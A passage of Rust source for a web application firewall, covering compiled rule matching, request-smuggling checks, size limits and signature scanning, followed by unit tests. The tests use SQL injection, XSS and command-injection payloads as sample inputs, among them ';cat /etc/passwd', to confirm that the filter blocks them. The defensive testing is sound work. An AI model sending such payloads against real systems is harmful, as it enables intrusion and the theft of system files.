    ends_with: FxHashMap<String, SuffixMatcher>,
    /// V230 — per-field bitmask describing which op kinds are present
    /// (see `FIELD_KIND_*` constants). Pre-computed once at build
    /// time. The eval hot path checks this bitmask before doing any
    /// per-kind HashMap lookup, skipping 1-3 lookups per field per
    /// request when those kinds are sparse — the typical case.
    field_kinds: FxHashMap<String, u8>,
    /// Slow-path rules — numeric ops + anything we don't recognise.
    /// Stored as rule indices; evaluated in order at the tail of eval.
    fallback: Vec<usize>,
    /// Distinct field names across all compiled+fallback buckets.
    /// Iterated in `eval` so each field's value is computed at most
    /// once per request.
    fields: Vec<String>,
}

struct FieldAutomaton {
    automaton: AhoCorasick,
    /// Pattern id (in `automaton`) → original rule index. Built with
    /// rule indices sorted ascending so leftmost-first matches map to
    /// the earliest rule.
    pattern_to_rule: Vec<usize>,
}

/// V230 — anchored Aho-Corasick wrapper for the `starts_with` rule
/// bucket. See [`CompiledRules::starts_with`] for motivation.
///
/// `Trivial` keeps the legacy Vec scan for tiny buckets (1-2 prefixes)
/// where AC build cost + indirection beats a couple of `starts_with`
/// calls. The threshold is set in [`PrefixMatcher::build`].
enum PrefixMatcher {
    /// Single prefix — `str::starts_with` is a memcmp and unbeatable.
    Trivial(Vec<(usize, String)>),
    /// 2+ prefixes — anchored AC with LeftmostFirst semantics.
    Automaton {
        automaton: AhoCorasick,
        /// Pattern id (in `automaton`) → original rule index. Pattern
        /// ids are assigned in ascending rule-index order so a
        /// LeftmostFirst match maps to the earliest declared rule.
        pattern_to_rule: Vec<usize>,
    },
}

impl PrefixMatcher {
    fn build(mut entries: Vec<(usize, String)>) -> Self {
        // Sort by rule index ascending so leftmost-first matches map
        // back to the earliest declared rule — matches the legacy
        // Vec-scan order (which broke on first-hit-in-rule-order).
        entries.sort_by_key(|(idx, _)| *idx);
        // Threshold: below this, the legacy Vec scan wins on a
        // per-request basis (str::starts_with is a memcmp; AC build
        // & dispatch overhead dominates). Above it, anchored AC is
        // O(L_max_prefix) regardless of bucket size.
        // Also fall back to Trivial when any pattern is empty — AC
        // rejects/degenerates on empty patterns, but `"".starts_with`
        // is true so the rule must still match. Pathological config,
        // documented for safety.
        if entries.len() <= 1 || entries.iter().any(|(_, p)| p.is_empty()) {
            return PrefixMatcher::Trivial(entries);
        }
        let pattern_to_rule: Vec<usize> = entries.iter().map(|(i, _)| *i).collect();
        let patterns: Vec<&str> = entries.iter().map(|(_, p)| p.as_str()).collect();
        let automaton = AhoCorasickBuilder::new()
            .match_kind(MatchKind::LeftmostFirst)
            .start_kind(StartKind::Anchored)
            .build(&patterns)
            .expect("AhoCorasick build of compiled WAF starts_with patterns");
        PrefixMatcher::Automaton {
            automaton,
            pattern_to_rule,
        }
    }

    /// Returns the smallest rule index whose prefix matches `input`,
    /// or `None`. Mirrors the legacy `for ... if v.starts_with(p) ...
    /// break` loop semantics. V230 — was O(N×L), now O(L_max_prefix).
    fn find(&self, input: &str) -> Option<usize> {
        match self {
            PrefixMatcher::Trivial(entries) => {
                for (idx, p) in entries {
                    if input.starts_with(p.as_str()) {
                        return Some(*idx);
                    }
                }
                None
            }
            PrefixMatcher::Automaton {
                automaton,
                pattern_to_rule,
            } => {
                let m = automaton.find(Input::new(input).anchored(Anchored::Yes))?;
                Some(pattern_to_rule[m.pattern().as_usize()])
            }
        }
    }
}

/// V230 — bucket-by-last-byte wrapper for the `ends_with` rule bucket.
/// See [`CompiledRules::ends_with`] for motivation.
///
/// 256 buckets keyed by the suffix's terminal byte. At eval time the
/// input's last byte selects exactly one bucket; the vast majority of
/// buckets are skipped without a single comparison. Sub-bucket order
/// preserves rule-index ascending so the first hit corresponds to the
/// earliest declared rule (matches legacy semantics).
struct SuffixMatcher {
    /// 256-entry table — one Vec per terminal byte. Most entries are
    /// empty in practice; the populated few hold the suffixes that end
    /// in that byte, sorted by rule index ascending.
    /// `Box<[...]>` over `Vec<[...]>` to skip the capacity word —
    /// the table is built once and never resized.
    by_last_byte: Box<[Vec<(usize, String)>; 256]>,
}

impl SuffixMatcher {
    fn build(mut entries: Vec<(usize, String)>) -> Self {
        // Sort once by rule index ascending so per-bucket scans return
        // the earliest declared rule on first hit.
        entries.sort_by_key(|(idx, _)| *idx);
        // Allocate the 256-bucket table on the heap to keep the
        // CompiledRules struct compact.
        let mut by_last_byte: Box<[Vec<(usize, String)>; 256]> =
            Box::new(std::array::from_fn(|_| Vec::new()));
        for (idx, suffix) in entries {
            // Empty suffix matches anything — push to every bucket so
            // last-byte dispatch still finds it. Pathological but
            // documented to preserve `"".ends_with(_)` semantics.
            if let Some(&last) = suffix.as_bytes().last() {
                by_last_byte[last as usize].push((idx, suffix));
            } else {
                for bucket in by_last_byte.iter_mut() {
                    bucket.push((idx, suffix.clone()));
                }
            }
        }
        SuffixMatcher { by_last_byte }
    }

    /// Returns the smallest rule index whose suffix matches `input`,
    /// or `None`. Mirrors the legacy `for ... if v.ends_with(p) ...
    /// break` loop semantics.
    fn find(&self, input: &str) -> Option<usize> {
        let Some(&last) = input.as_bytes().last() else {
            // Empty input — only an empty-suffix rule could match.
            // The empty suffix was pushed into every bucket; pick any.
            return self.by_last_byte[0]
                .iter()
                .find(|(_, s)| s.is_empty())
                .map(|(idx, _)| *idx);
        };
        for (idx, p) in &self.by_last_byte[last as usize] {
            if input.ends_with(p.as_str()) {
                return Some(*idx);
            }
        }
        None
    }
}

/// Verify the compound `all_of` conditions of a single rule against the
/// request. Returns true when EVERY group matches (each group matching if
/// the request's value for `g.field` op-matches ANY string in
/// `g.any_of`), or when `all_of` is empty (a legacy single-condition
/// rule — the fast path, byte-identical to pre-compound behaviour).
///
/// Runs only AFTER a primary hit (rare on normal traffic), so it is off
/// the hot path. Group field values are resolved via [`val_with_canon`]
/// (the same per-field lookup the primary match uses) and group `any_of`
/// values are canonicalised the SAME way primary rule values are
/// (`canon(...)`), so a compound condition matches identically to how the
/// equivalent primary condition would.
fn all_of_matches<'a>(
    ctx: &'a RequestContext,
    canon_ctx: &'a CanonCtx<'a>,
    rule: &WafRule,
) -> bool {
    if rule.all_of.is_empty() {
        return true;
    }
    rule.all_of.iter().all(|g| group_matches(ctx, canon_ctx, g))
}

/// True when the request's value for `g.field` op-matches ANY string in
/// `g.any_of` (an OR over the group's values). Mirrors the primary-match
/// canonicalisation: the request value comes from [`val_with_canon`]
/// (already canonical) and each `any_of` needle is run through `canon`.
fn group_matches<'a>(
    ctx: &'a RequestContext,
    canon_ctx: &'a CanonCtx<'a>,
    g: &WafAndGroup,
) -> bool {
    let lhs = val_with_canon(ctx, canon_ctx, &g.field);
    g.any_of.iter().any(|needle| {
        let rhs = canon(needle);
        op_matches(lhs.as_ref(), &g.op, rhs.as_ref())
    })
}

impl CompiledRules {
    /// V237 — compile the rule plan, additionally dropping any rule
    /// whose `id` is in `overlay_disabled` (the Sigma per-rule
    /// enable/disable overlay). Disabled rules never enter the
    /// automata/HashMaps, so they cost nothing on the hot path.
    fn build_with_overlay(rules: &[WafRule], overlay_disabled: &HashSet<String>) -> Self {
        // V230 — bonus: FxHashMap throughout the build (keys are
        // operator-supplied field names, not attacker-controlled).
        let mut contains_by_field: FxHashMap<String, Vec<(usize, String)>> = FxHashMap::default();
        let mut equals: FxHashMap<String, HashMap<String, usize>> = FxHashMap::default();
        let mut starts_with: FxHashMap<String, Vec<(usize, String)>> = FxHashMap::default();
        let mut ends_with: FxHashMap<String, Vec<(usize, String)>> = FxHashMap::default();
        let mut fallback: Vec<usize> = Vec::new();
        let mut fields_set: HashSet<String> = HashSet::new();
        // V230 — per-field op-kind bitmask, populated alongside the
        // per-kind bucket inserts. See `FIELD_KIND_*` constants.
        let mut field_kinds: FxHashMap<String, u8> = FxHashMap::default();

        for (idx, r) in rules.iter().enumerate() {
            // V109 — skip Disabled rules at compile time so the hot
            // path doesn't pay for matching them. Shadow / Log rules
            // DO get compiled because we want them to match (and
            // the action is what's gated, not the matching).
            if matches!(rule_mode_of(r), RuleMode::Disabled) {
                continue;
            }
            // V237 — operator turned this rule off via the panel
            // (Sigma overlay). Skip it exactly like a `disabled` rule
            // so the hot path never sees it. Cheap: one HashSet probe
            // per rule, only at compile/reload time.
            if !overlay_disabled.is_empty() && overlay_disabled.contains(&r.id) {
                continue;
            }
            fields_set.insert(r.field.clone());
            // Canonicalise the rule value once — matches the pre-V95
            // call sites' use of `canon(&r.value)` on the hot path.
            let rhs = canon(&r.value).into_owned();
            match r.op.as_str() {
                "contains" | "regex" => {
                    contains_by_field
                        .entry(r.field.clone())
                        .or_default()
                        .push((idx, rhs));
                    *field_kinds.entry(r.field.clone()).or_insert(0) |= FIELD_KIND_CONTAINS;
                }
                "equals" => {
                    equals
                        .entry(r.field.clone())
                        .or_default()
                        .entry(rhs)
                        // first-write wins — preserves earliest-rule
                        // precedence when two rules share the same
                        // (field, equals, value).
                        .or_insert(idx);
                    *field_kinds.entry(r.field.clone()).or_insert(0) |= FIELD_KIND_EQUALS;
                }
                "starts_with" => {
                    starts_with
                        .entry(r.field.clone())
                        .or_default()
                        .push((idx, rhs));
                    *field_kinds.entry(r.field.clone()).or_insert(0) |= FIELD_KIND_STARTS;
                }
                "ends_with" => {
                    ends_with
                        .entry(r.field.clone())
                        .or_default()
                        .push((idx, rhs));
                    *field_kinds.entry(r.field.clone()).or_insert(0) |= FIELD_KIND_ENDS;
                }
                _ => {
                    // gt/lt/ge/le + unknown ops → slow path.
                    fallback.push(idx);
                }
            }
        }

        let mut contains: FxHashMap<String, FieldAutomaton> = FxHashMap::default();
        for (field, mut entries) in contains_by_field {
            // Sort by rule index ascending so leftmost-first
            // matches map back to the earliest declared rule.
            entries.sort_by_key(|(idx, _)| *idx);
            let pattern_to_rule: Vec<usize> = entries.iter().map(|(i, _)| *i).collect();
            let patterns: Vec<&str> = entries.iter().map(|(_, p)| p.as_str()).collect();
            // LeftmostFirst on AhoCorasick: among overlapping matches,
            // returns the one whose pattern was registered earliest
            // (i.e. earliest rule), which is what we want.
            let automaton = AhoCorasick::builder()
                .match_kind(MatchKind::LeftmostFirst)
                .build(&patterns)
                .expect("AhoCorasick build of compiled WAF contains patterns");
            contains.insert(
                field,
                FieldAutomaton {
                    automaton,
                    pattern_to_rule,
                },
            );
        }
        // V230 — convert per-field accumulator Vecs into the smarter
        // matchers. `PrefixMatcher::build` chooses Trivial vs anchored
        // AhoCorasick per bucket; `SuffixMatcher::build` does the
        // last-byte bucketing. Sort order (by rule idx ascending) is
        // handled inside each `::build` so the first-hit-wins semantic
        // of the legacy `for ... break` loop is preserved.
        let starts_with: FxHashMap<String, PrefixMatcher> = starts_with
            .into_iter()
            .map(|(f, v)| (f, PrefixMatcher::build(v)))
            .collect();
        let ends_with: FxHashMap<String, SuffixMatcher> = ends_with
            .into_iter()
            .map(|(f, v)| (f, SuffixMatcher::build(v)))
            .collect();

        Self {
            contains,
            equals,
            starts_with,
            ends_with,
            field_kinds,
            fallback,
            fields: fields_set.into_iter().collect(),
        }
    }

    /// Evaluate the compiled rule set against `ctx`. Returns the
    /// 0-based rule index of the FIRST matching rule (in original
    /// declaration order), or None when nothing matched.
    ///
    /// `rules` is the source slice — needed for the numeric/fallback
    /// path where we still parse `r.op` + `r.value` directly.
    ///
    /// V230 — takes a request-scoped [`CanonCtx`] so the common-field
    /// `canon()` work is shared with the built-in signature scan.
    /// Per-field probes are gated on the precomputed `field_kinds`
    /// bitmask: when a field only has, e.g., `contains` rules, the
    /// eval skips the 3 equals/starts/ends HashMap lookups entirely.
    fn eval<'a>(
        &self,
        ctx: &'a RequestContext,
        canon_ctx: &'a CanonCtx<'a>,
        rules: &[WafRule],
    ) -> Option<usize> {
        // V230 — memoise val_with_canon(ctx, field) per unique field.
        // Cache holds `Cow<'a, str>` so a borrowed-from-canon-ctx value
        // (the hot path for `path`/`method`/`ua`/`host`/etc.) requires
        // zero per-request String allocs. Owned variants are kept by
        // the cache itself so later borrows survive the loop.
        // V230 — FxHashMap because the keys are bounded operator-
        // supplied field names.
        let mut cache: FxHashMap<&str, Cow<'a, str>> =
            FxHashMap::with_capacity_and_hasher(self.fields.len(), Default::default());
        // First pass: scan compiled buckets in field-iteration order,
        // tracking the smallest rule index that hit so the result
        // matches the pre-V95 "first declared rule wins" behaviour.
        let mut best: Option<usize> = None;
        // Set when a primary candidate for the current field had a
        // non-empty `all_of` that failed; triggers the per-field
        // compound-rule rescan below. Never set on legacy (empty-`all_of`)
        // rulesets, so the fast path stays byte-identical for them.
        let mut needs_rescan = false;

        // Accept a primary-match candidate at `idx` IFF its compound
        // `all_of` (if any) also matches; then bump `best` to the
        // smallest accepted index. For the common legacy rule (empty
        // `all_of`) `all_of_matches` short-circuits to `true`, so this is
        // identical to the pre-compound `bump`. Returns whether the
        // candidate was accepted, so callers know if they must keep
        // looking in the same bucket (a failed compound rule must not
        // suppress a later matching rule).
        let accept = |best: &mut Option<usize>, idx: usize| -> bool {
            if all_of_matches(ctx, canon_ctx, &rules[idx]) {
                if best.is_none_or(|b| idx < b) {
                    *best = Some(idx);
                }
                true
            } else {
                false
            }
        };

        for field in &self.fields {
            let v = cache
                .entry(field.as_str())
                .or_insert_with(|| val_with_canon(ctx, canon_ctx, field));
            // V230 — pre-fetch per-field kind bitmask once. Lookup is
            // FxHashMap so ~5 ns; cheaper than the 3 conditional
            // HashMap probes it gates. `None` means no compiled rules
            // for this field at all (only fallback) — skip the whole
            // per-kind probe block.
            let flags = self.field_kinds.get(field.as_str()).copied().unwrap_or(0);
            if (flags & FIELD_KIND_CONTAINS) != 0
                && let Some(fa) = self.contains.get(field)
                && let Some(m) = fa.automaton.find(v.as_ref())
            {
                let idx = fa.pattern_to_rule[m.pattern().as_usize()];
                // Fast path: accept the leftmost candidate. If its
                // compound `all_of` failed, the candidate doesn't fire —
                // and because the automaton only surfaces the leftmost
                // match, a different rule in the same bucket could be
                // masked. Flag a field-level rescan so a failed compound
                // rule can't suppress a later matching rule.
                if !accept(&mut best, idx) {
                    needs_rescan = true;
                }
            }
            if (flags & FIELD_KIND_EQUALS) != 0
                && let Some(map) = self.equals.get(field)
                && let Some(&idx) = map.get(v.as_ref())
            {
                // Equals stores a single rule index per exact value
                // (first-write wins); any other rule with the same
                // (field, equals, value) is an identical condition, so
                // there's no distinct later rule to fall back to.
                accept(&mut best, idx);
            }
            // V230 — was a linear `for ... if v.starts_with(p) ... break`
            // scan over a per-field `Vec<(usize, String)>`. Now an
            // anchored AhoCorasick pass (or single-prefix Vec for tiny
            // buckets) inside [`PrefixMatcher::find`]. O(L_max_prefix)
            // independent of bucket size.
            if (flags & FIELD_KIND_STARTS) != 0
                && let Some(pm) = self.starts_with.get(field)
                && let Some(idx) = pm.find(v.as_ref())
                && !accept(&mut best, idx)
            {
                needs_rescan = true;
            }
            // V230 — was a linear `for ... if v.ends_with(p) ... break`
            // scan. Now a last-byte-bucketed lookup inside
            // [`SuffixMatcher::find`]: the input's terminal byte
            // selects one of 256 buckets and only suffixes sharing
            // that byte are compared. Skips ~99% of the bucket table
            // for the typical case.
            if (flags & FIELD_KIND_ENDS) != 0
                && let Some(sm) = self.ends_with.get(field)
                && let Some(idx) = sm.find(v.as_ref())
                && !accept(&mut best, idx)
            {
                needs_rescan = true;
            }

            // Compound-rule slow path (off the hot path — only entered
            // when a primary candidate for THIS field had a non-empty
            // `all_of` that failed). The compiled matchers only surface
            // the single leftmost/earliest candidate per bucket, so when
            // it's a failed compound rule we re-scan the source `rules`
            // slice for ANY rule on this field whose op-match against `v`
            // holds AND whose `all_of` passes, accepting the smallest
            // such index. This guarantees a failed compound rule never
            // suppresses a later matching rule. Legacy rulesets (no
            // compound rules) never set `needs_rescan`, so the fast path
            // above stays byte-identical.
            if needs_rescan {
                needs_rescan = false;
                for (idx, r) in rules.iter().enumerate() {
                    if r.field != *field {
                        continue;
                    }
                    if best.is_some_and(|b| b <= idx) {
                        // A smaller-or-equal index already won; nothing
                        // later in declaration order can beat it.
                        break;
                    }
                    if op_matches(v.as_ref(), &r.op, canon(&r.value).as_ref()) {
                        accept(&mut best, idx);
                    }
                }
            }
        }
        // Fallback: numeric / unknown ops, in original order. Stop at
        // the first hit that's earlier than `best`, since anything
        // later can't beat it.
        for &idx in &self.fallback {
            if best.is_some_and(|b| b <= idx) {
                break;
            }
            let r = &rules[idx];
            let v = cache
                .entry(r.field.as_str())
                .or_insert_with(|| val_with_canon(ctx, canon_ctx, &r.field));
            let hit = match r.op.as_str() {
                "gt" | "lt" | "ge" | "le" => cmp_numeric(v.as_ref(), &r.value, r.op.as_str()),
                _ => false,
            };
            if hit {
                // `accept` additionally verifies the rule's compound
                // `all_of` (no-op for legacy empty-`all_of` numeric rules).
                accept(&mut best, idx);
            }
        }
        best
    }
}

impl TrafficFilter for WafFilter {
    fn name(&self) -> &'static str {
        "waf"
    }
    fn check(&self, ctx: &RequestContext) -> FilterAction {
        // V231 — no `self.enabled` gate here: the FilterEngine decides
        // (via RuntimeToggles + per-domain domain_policy) whether to
        // call check() at all. Self-gating broke per-domain force-enable.

        // -- HTTP request-smuggling: CL/TE / TE/CL / duplicate-CL --
        if self.block_smuggling {
            let cl_values: Vec<&str> = ctx
                .headers
                .get_all("content-length")
                .iter()
                .filter_map(|v| v.to_str().ok())
                .collect();
            // M5 — duplicate Transfer-Encoding (TE.TE desync). The old
            // code read TE via `.get()` (FIRST value only) while CL used
            // `.get_all()`, so a request with two TE headers — e.g.
            // `Transfer-Encoding: chunked` + `Transfer-Encoding: identity`
            // — was only half-inspected: front/back-end hops that pick a
            // DIFFERENT one of the two desync, and the masked value could
            // smuggle a request. Read ALL TE headers, reject when more
            // than one is present, and validate EVERY value.
            let te_values: Vec<String> = ctx
                .headers
                .get_all("transfer-encoding")
                .iter()
                .filter_map(|v| v.to_str().ok())
                .map(|s| s.to_ascii_lowercase())
                .collect();
            // Multiple CL headers → ambiguous. Or two CL values disagreeing.
            if cl_values.len() > 1 {
                let distinct: HashSet<&&str> = cl_values.iter().collect();
                if distinct.len() > 1 {
                    return FilterAction::Deny {
                        status: 400,
                        reason: "smuggling: conflicting content-length headers".into(),
                    };
                }
            }
            // M5 — more than one TE header line is inherently ambiguous
            // (which one does each hop honour?). Reject outright.
            if te_values.len() > 1 {
                return FilterAction::Deny {
                    status: 400,
                    reason: "smuggling: multiple transfer-encoding headers".into(),
                };
            }
            if let Some(te_val) = te_values.first() {
                let has_chunked = te_val.split(',').any(|t| t.trim() == "chunked");
                if !cl_values.is_empty() && has_chunked {
                    return FilterAction::Deny {
                        status: 400,
                        reason: "smuggling: both content-length and transfer-encoding present"
                            .into(),
                    };
                }
                // Non-chunked TE values are dangerous (TE: cow → some
                // hops treat as identity, some as chunked).
                if !te_val.split(',').all(|t| {
                    matches!(
                        t.trim(),
                        "chunked" | "identity" | "compress" | "deflate" | "gzip"
                    )
                }) {
                    return FilterAction::Deny {
                        status: 400,
                        reason: "smuggling: unknown transfer-encoding token".into(),
                    };
                }
            }
        }

        // -- Method allowlist --
        if let Some(allowed) = &self.allowed_methods {
            let m = ctx.method.as_str();
            if !allowed.contains(&m.to_ascii_uppercase()) {
                return FilterAction::Deny {
                    status: 405,
                    reason: format!("method {m} not allowed").into(),
                };
            }
        }

        // -- Header count + per-header size + total URI size --
        if ctx.headers.len() > self.max_header_count {
            return FilterAction::Deny {
                status: 431,
                reason: format!(
                    "too many headers ({} > {})",
                    ctx.headers.len(),
                    self.max_header_count
                )
                .into(),
            };
        }
        for (name, value) in ctx.headers.iter() {
            if value.len() > self.max_header_value_bytes {
                return FilterAction::Deny {
                    status: 431,
                    reason: format!("header `{name}` value too large ({} bytes)", value.len())
                        .into(),
                };
            }
        }
        if ctx.path.len() > self.max_uri_bytes {
            return FilterAction::Deny {
                status: 414,
                reason: format!("uri too long ({} bytes)", ctx.path.len()).into(),
            };
        }

        // -- Declared body size (real size re-checked in inspect_body) --
        if let Some(len) = ctx
            .headers
            .get("content-length")
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.parse::<usize>().ok())
            && len > self.max_body_bytes
        {
            return FilterAction::Deny {
                status: 413,
                reason: "waf body too large".into(),
            };
        }

        // -- Built-in signature match on URI + UA + a few key headers --
        // Phase C.2 — was a single concatenated `format!(...)` over all
        // fields; allocated a String + cloned user_agent on EVERY
        // request, even for legit traffic with no signature hits.
        // Patterns never span field boundaries (scanner paths, SQLi
        // tokens are self-contained), so we can scan each field
        // independently and short-circuit on the first hit. Zero
        // allocation on the hot path for legit traffic.
        //
        // V230 — canonicalise each common field exactly ONCE per
        // request into a stack-local `CanonCtx`, then share the
        // canon'd forms between the built-in signature scan (via
        // `match_signature_canon`) and the compiled custom-rules
        // eval (via `eval` taking `&canon_ctx`). The previous flow
        // canonicalised each field twice: once here in
        // `match_signature(raw)` and again inside `val(ctx, field)`
        // for every compiled-rules field touch. Eliminates 5-10
        // redundant `canon()` calls per request on the hot path.
        //
        // Field order matches the original concat order so leftmost-
        // first semantics in the AC automaton are preserved per-field.
        let canon_ctx = CanonCtx::from_ctx(ctx);
        for field in [
            canon_ctx.method.as_ref(),
            canon_ctx.path.as_ref(),
            canon_ctx.user_agent.as_ref(),
            canon_ctx.referer.as_ref(),
            canon_ctx.cookie.as_ref(),
        ] {
            if field.is_empty() {
                continue;
            }
            if let Some(kind) = self.match_signature_canon(field) {
                return FilterAction::Deny {
                    status: 403,
                    reason: format!("waf signature: {kind}").into(),
                };
            }
        }

        // -- Custom rules (V95 compiled plan) --
        // Single AhoCorasick pass per field for all contains/regex rules
        // + O(1) equals/starts_with/ends_with via per-field buckets +
        // numeric/unknown ops on a tiny fallback list. The previous
        // implementation was O(N rules × String::contains cost); the
        // compiled plan is O(F unique fields × single-pass cost).
        // V230 — passes the request-scoped `canon_ctx` so `path`,
        // `method`, `user_agent`, `referer`, `cookie`, `host` skip
        // their per-field `canon()` and reuse what was already done
        // for the signature scan above.
        let compiled = self.compiled.load();
        let rules = self.custom_rules.load();
        if let Some(hit) = compiled.eval(ctx, &canon_ctx, &rules) {
            return self.rule_action(&rules, hit);
        }

        FilterAction::Allow
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::WafRule;

    fn make(rules: Vec<WafRule>, max: Option<usize>) -> WafFilter {
        WafFilter::new(&WafConfig {
            enabled: true,
            custom_rules: rules,
            max_body_bytes: max,
            ..Default::default()
        })
    }

    fn full_default() -> WafFilter {
        WafFilter::new(&WafConfig {
            enabled: true,
            block_smuggling: true,
            allowed_methods: default_allowed_methods_for_test(),
            max_header_value_bytes: 8 * 1024,
            max_header_count: 64,
            max_uri_bytes: 8 * 1024,
            max_decompress_ratio: 100,
            ..Default::default()
        })
    }

    fn default_allowed_methods_for_test() -> Vec<String> {
        crate::config::default_allowed_methods_pub()
    }

    #[test]
    fn canon_clean_path_is_borrowed() {
        // Hot path: nothing to normalise, must return Cow::Borrowed
        // (zero-alloc). Regression guard for the fast-path predicate.
        let input = "/api/v1/users";
        let out = canon(input);
        assert!(matches!(out, Cow::Borrowed(_)));
        assert_eq!(out.as_ref(), input);
    }

    #[test]
    fn canon_uppercase_triggers_alloc() {
        let input = "/API/Users";
        let out = canon(input);
        assert!(matches!(out, Cow::Owned(_)));
        assert_eq!(out.as_ref(), "/api/users");
    }

    #[test]
    fn canon_double_encoded_still_normalised() {
        // `%2527` → `%27` → `'`. The multi-pass loop must still
        // peel double-encoding after the Cow rewrite.
        let out = canon("%2527%2520OR%25201=1");
        assert!(
            out.as_ref().contains("' or 1=1") || out.as_ref().contains("'  or  1=1"),
            "unexpected canon output: {out}"
        );
    }

    #[test]
    fn canon_mysql_versioned_comment_stripped() {
        let out = canon("/*!union*/+select");
        assert!(out.as_ref().contains("union") && out.as_ref().contains("select"));
        assert!(!out.as_ref().contains("/*!") && !out.as_ref().contains("*/"));
    }

    #[test]
    fn canon_whitespace_collapsed() {
        let out = canon("a  b\t\tc");
        assert_eq!(out.as_ref(), "a b c");
    }

    #[test]
    fn sqli_signature_denies() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/api?q=1' UNION SELECT * FROM users");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => assert!(reason.contains("sqli")),
            other => panic!("expected sqli deny, got {other:?}"),
        }
    }

    #[test]
    fn xss_signature_denies() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/p?x=<script>alert(1)</script>");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn cmdi_signature_denies() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?cmd=foo;cat /etc/passwd");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn benign_request_allowed() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/health");
        assert_eq!(f.check(&ctx), FilterAction::Allow);
    }

    #[test]
    fn disabled_filter_reports_config_disabled() {
        // V231 — check() no longer self-gates on `enabled`; the engine
        // owns enable/disable. A disabled filter is one whose config
        // state is false, surfaced via config_enabled() (which
        // FilterEngine::new uses to seed its RuntimeToggles). Calling
        // check() directly would still inspect — that's the engine's
        // call to make, not the filter's.
        let f = WafFilter::new(&WafConfig {
            enabled: false,
            ..Default::default()
        });
        assert!(!f.config_enabled());
    }

    #[test]
    fn body_too_large_denies() {
        let f = make(vec![], Some(10));
        let ctx = RequestContext::test_with("1.1.1.1", "/").with_header("content-length", "1024");
        match f.check(&ctx) {
            FilterAction::Deny { status, .. } => assert_eq!(status, 413),
            other => panic!("expected 413, got {other:?}"),
        }
    }

    #[test]
    fn shadow_rule_does_not_block_but_counts() {
        let f = make(
            vec![WafRule {
                id: "shadow-1".to_string(),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: "/secret".to_string(),
                action: "deny".to_string(),
                mode: Some("shadow".to_string()),
                ..Default::default()
            }],
            None,
        );
        let before = f.shadow_observed();
        let ctx = RequestContext::test_with("1.1.1.1", "/secret/file");
        assert!(matches!(f.check(&ctx), FilterAction::Allow));
        assert!(f.shadow_observed() > before, "shadow counter must bump");
    }

    #[test]
    fn disabled_rule_skipped_at_compile() {
        let f = make(
            vec![
                WafRule {
                    id: "off".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/wp-admin".to_string(),
                    action: "deny".to_string(),
                    mode: Some("disabled".to_string()),
                    ..Default::default()
                },
                WafRule {
                    id: "on".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/etc/passwd".to_string(),
                    action: "deny".to_string(),
                    ..Default::default()
                },
            ],
            None,
        );
        let ctx1 = RequestContext::test_with("1.1.1.1", "/wp-admin");
        assert!(matches!(f.check(&ctx1), FilterAction::Allow));
        let ctx2 = RequestContext::test_with("1.1.1.1", "/etc/passwd");
        assert!(matches!(f.check(&ctx2), FilterAction::Deny { .. }));
    }

    #[test]
    fn severity_parses_known_values() {
        use crate::ddos::risk_engine::WafSeverity;
        assert_eq!(parse_severity(Some("critical")), WafSeverity::Critical);
        assert_eq!(parse_severity(Some("HIGH")), WafSeverity::High);
        assert_eq!(parse_severity(Some("medium")), WafSeverity::Medium);
        assert_eq!(parse_severity(Some("low")), WafSeverity::Low);
        assert_eq!(parse_severity(None), WafSeverity::Medium);
        assert_eq!(parse_severity(Some("unknown-value")), WafSeverity::Medium);
    }

    #[test]
    fn custom_rule_contains_denies() {
        let f = make(
            vec![WafRule {
                id: "no-admin".to_string(),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: "/wp-admin".to_string(),
                action: "deny".to_string(),
                ..Default::default()
            }],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/wp-admin/login.php");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    // --- Compound (AND-of-OR) `all_of` rules --------------------------
    // The Sigma corpus needs real compound conditions: a rule must fire
    // only when its PRIMARY {field, op, value} matches AND every `all_of`
    // group matches (each group an OR over `any_of`). These guard that
    // semantic plus the requirement that a failed compound rule never
    // suppresses a later, independently-matching rule.

    /// (a) A compound rule fires only when the primary AND every group
    /// match. Primary: path contains `/admin`; group: method == POST.
    #[test]
    fn compound_rule_fires_when_primary_and_all_groups_match() {
        let f = make(
            vec![WafRule {
                id: "admin-post".to_string(),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: "/admin".to_string(),
                action: "deny".to_string(),
                all_of: vec![WafAndGroup {
                    field: "method".to_string(),
                    op: "equals".to_string(),
                    any_of: vec!["POST".to_string()],
                }],
                ..Default::default()
            }],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/admin/settings").with_method("POST");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => {
                assert!(reason.contains("admin-post"), "got {reason}");
            }
            other => panic!("expected Deny, got {other:?}"),
        }
    }

    /// (b) Primary matches but a group fails → the rule must NOT fire.
    /// Same rule as (a) but the request is a GET, so the method group
    /// fails and the bare `path contains /admin` must not block (this is
    /// exactly the FP-storm the compound model prevents).
    #[test]
    fn compound_rule_not_blocked_when_a_group_fails() {
        let f = make(
            vec![WafRule {
                id: "admin-post".to_string(),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: "/admin".to_string(),
                action: "deny".to_string(),
                all_of: vec![WafAndGroup {
                    field: "method".to_string(),
                    op: "equals".to_string(),
                    any_of: vec!["POST".to_string()],
                }],
                ..Default::default()
            }],
            None,
        );
        // GET /admin/settings — primary hits, method group fails.
        let ctx = RequestContext::test_with("1.1.1.1", "/admin/settings");
        assert_eq!(f.check(&ctx), FilterAction::Allow);
    }

    /// (c) An OR group matches on its 2nd `any_of` value. Primary: path
    /// contains `/admin`; group: method is one of {PUT, DELETE}; request
    /// uses DELETE (the second listed value).
    #[test]
